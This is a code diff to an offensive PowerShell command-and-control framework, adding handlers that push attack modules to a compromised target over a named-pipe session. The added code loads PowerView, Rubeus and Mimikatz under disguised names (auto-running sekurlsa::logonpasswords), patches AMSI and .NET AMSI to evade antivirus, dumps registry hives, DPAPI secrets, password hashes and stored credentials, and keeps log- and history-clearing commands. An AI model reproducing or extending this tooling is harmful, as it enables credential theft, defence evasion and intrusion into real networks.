@@ -3797,10 +3797,8 @@ function InteractWithPipeSession{
   		$command = $command.TrimEnd()
 		
 		$allowedCommands = @(
-			"AV", "Kerb", "Patch", "PatchNet", "PInject", "Services", "ShellGen",
-			"HashGrab", "Rubeus", "PowerView", "Hive", "Dpapi", "PPL", "MultiRDP",
-			"Mimi", "AutoMimi", "ClearLogs", "ClearHistory", "Net", "Sessions", "Software", "CredMan", 
-			"Startup", "TLS", "Process"
+			"AV", "Services", "Net", "Sessions", "Software", "Startup", "TLS", "Process",
+			"ClearLogs", "ClearHistory"
 		)
 
   		if($command -like "Kerb" -OR $command -like "Invoke-PassSpray*" -OR $command -like "DCSync" -OR $command -like "Access_Check*" -OR $command -like "Find-LocalAdminAccess*" -OR $command -like "Invoke-SessionHunter*" -OR $command -like "AutoMimi*" -OR $command -like "Mimi*" -OR $command -like "KrbRelayUp*"){
@@ -4470,6 +4468,7 @@ function InteractWithPipeSession{
 				$sw.Flush()
 			} else {
 				Write-Output " [-] PowerUp not in cache. Add PowerUp.ps1 to Tools\ and run: modules reload"
+				continue
 			}
 		}
 
@@ -4483,6 +4482,7 @@ function InteractWithPipeSession{
 				$sw.Flush()
 			} else {
 				Write-Output " [-] PrivescCheck not in cache. Add PrivescCheck.ps1 to Tools\ and run: modules reload"
+				continue
 			}
 		}
 
@@ -4499,7 +4499,163 @@ function InteractWithPipeSession{
 					$sw.Flush()
 				} else {
 					Write-Output " [-] GodPotato not in cache. Add Invoke-GodPotato.ps1 to Tools\ and run: modules reload"
+					continue
 				}
+			}
+		}
+
+		elseif ($command -eq 'PowerView') {
+			Write-Output ""
+			Write-Output " [+] Sending PowerView to target..."
+			if (Send-Module -ToolName 'pwv' -Writer $sw -Reader $sr) {
+				Write-Output " [+] PowerView loaded -- Get-Domain, Get-DomainUser, Get-DomainComputer, etc."
+				Write-Output ""
+			} else {
+				Write-Output " [-] PowerView not in cache. Add pwv.ps1 to Tools\ and run: modules reload"
+			}
+			continue
+		}
+
+		elseif ($command -eq 'Kerb') {
+			Write-Output ""
+			Write-Output " [+] Sending Kerb to target..."
+			if (Send-Module -ToolName 'dumper' -Writer $sw -Reader $sr) {
+				Write-Output " [+] Kerb loaded -- run: Invoke-Kirby"
+				Write-Output ""
+			} else {
+				Write-Output " [-] Kerb not in cache. Add dumper.ps1 to Tools\ and run: modules reload"
+			}
+			continue
+		}
+
+		elseif ($command -eq 'Patch') {
+			Write-Output ""
+			Write-Output " [+] Sending SimpleAMSI to target..."
+			if (Send-Module -ToolName 'SimpleAMSI' -Writer $sw -Reader $sr) {
+				Write-Output " [+] AMSI patched"
+				Write-Output ""
+			} else {
+				Write-Output " [-] SimpleAMSI not in cache. Add SimpleAMSI.ps1 to Tools\ and run: modules reload"
+			}
+			continue
+		}
+
+		elseif ($command -eq 'PatchNet') {
+			Write-Output ""
+			Write-Output " [+] Sending NETAMSI to target..."
+			if (Send-Module -ToolName 'NETAMSI' -Writer $sw -Reader $sr) {
+				Write-Output " [+] .NET AMSI patched"
+				Write-Output ""
+			} else {
+				Write-Output " [-] NETAMSI not in cache. Add NETAMSI.ps1 to Tools\ and run: modules reload"
+			}
+			continue
+		}
+
+		elseif ($command -eq 'Mimi') {
+			Write-Output ""
+			Write-Output " [+] Sending Mimi to target..."
+			if (Send-Module -ToolName 'Suntour' -Writer $sw -Reader $sr) {
+				Write-Output " [+] Mimi loaded -- run: Mimi -Command 'sekurlsa::logonpasswords'"
+				Write-Output ""
+			} else {
+				Write-Output " [-] Mimi not in cache. Add Suntour.ps1 to Tools\ and run: modules reload"
+			}
+			continue
+		}
+
+		elseif ($command -eq 'AutoMimi') {
+			Write-Output ""
+			Write-Output " [+] Sending Mimi to target..."
+			if (Send-Module -ToolName 'Suntour' -Writer $sw -Reader $sr) {
+				Write-Output " [+] AutoMimi loaded -- running sekurlsa::logonpasswords"
+				Write-Output ""
+				$sw.WriteLine('Mimi -Command "sekurlsa::logonpasswords"')
+				$sw.Flush()
+			} else {
+				Write-Output " [-] Mimi not in cache. Add Suntour.ps1 to Tools\ and run: modules reload"
+				continue
+			}
+		}
+
+		elseif ($command -eq 'Rubeus') {
+			Write-Output ""
+			Write-Output " [+] Sending Rubeus to target..."
+			if (Send-Module -ToolName 'Ferrari' -Writer $sw -Reader $sr) {
+				Write-Output " [+] Rubeus loaded -- run: Rubeus <command>"
+				Write-Output ""
+			} else {
+				Write-Output " [-] Rubeus not in cache. Add Ferrari.ps1 to Tools\ and run: modules reload"
+			}
+			continue
+		}
+
+		elseif ($command -eq 'Hive') {
+			Write-Output ""
+			Write-Output " [+] Sending HiveDump to target..."
+			if (Send-Module -ToolName 'HiveDump' -Writer $sw -Reader $sr) {
+				Write-Output " [+] HiveDump loaded -- running Invoke-HiveDump"
+				Write-Output ""
+				$sw.WriteLine("Invoke-HiveDump")
+				$sw.Flush()
+			} else {
+				Write-Output " [-] HiveDump not in cache. Add HiveDump.ps1 to Tools\ and run: modules reload"
+				continue
+			}
+		}
+
+		elseif ($command -eq 'Dpapi') {
+			Write-Output ""
+			Write-Output " [+] Sending Dpapi to target..."
+			if (Send-Module -ToolName 'Dpapi' -Writer $sw -Reader $sr) {
+				Write-Output " [+] DpapiDump loaded"
+				Write-Output ""
+			} else {
+				Write-Output " [-] Dpapi not in cache. Add Dpapi.ps1 to Tools\ and run: modules reload"
+			}
+			continue
+		}
+
+		elseif ($command -eq 'PInject') {
+			Write-Output ""
+			Write-Output " [+] Sending PInject to target..."
+			if (Send-Module -ToolName 'PInject' -Writer $sw -Reader $sr) {
+				Write-Output " [+] PInject loaded"
+				Write-Output ""
+			} else {
+				Write-Output " [-] PInject not in cache. Add PInject.ps1 to Tools\ and run: modules reload"
+			}
+			continue
+		}
+
+		elseif ($command -eq 'HashGrab') {
+			Write-Output ""
+			Write-Output " [+] Sending HashGrab to target..."
+			$hgOk = (Send-Module -ToolName 'SimpleAMSI' -Writer $sw -Reader $sr) -and
+			         (Send-Module -ToolName 'NETAMSI' -Writer $sw -Reader $sr) -and
+			         (Send-Module -ToolName 'Invoke-GrabTheHash' -Writer $sw -Reader $sr)
+			if ($hgOk) {
+				Write-Output " [+] HashGrab loaded -- running Invoke-GrabTheHash"
+				Write-Output ""
+				$sw.WriteLine("Invoke-GrabTheHash")
+				$sw.Flush()
+			} else {
+				Write-Output " [-] HashGrab tools not in cache. Ensure SimpleAMSI.ps1, NETAMSI.ps1, Invoke-GrabTheHash.ps1 are in Tools\ and run: modules reload"
+				continue
+			}
+		}
+
+		elseif ($command -eq 'CredMan') {
+			Write-Output ""
+			Write-Output " [+] Sending CredMan to target..."
+			if (Send-Module -ToolName 'cms' -Writer $sw -Reader $sr) {
+				Write-Output " [+] CredMan loaded -- running Enum-Creds"
+				Write-Output ""
+				$sw.WriteLine("Enum-Creds")
+				$sw.Flush()
+			} else {
+				Write-Output " [-] CredMan not in cache. Add cms.ps1 to Tools\ and run: modules reload"
+				continue
 			}
 		}
 
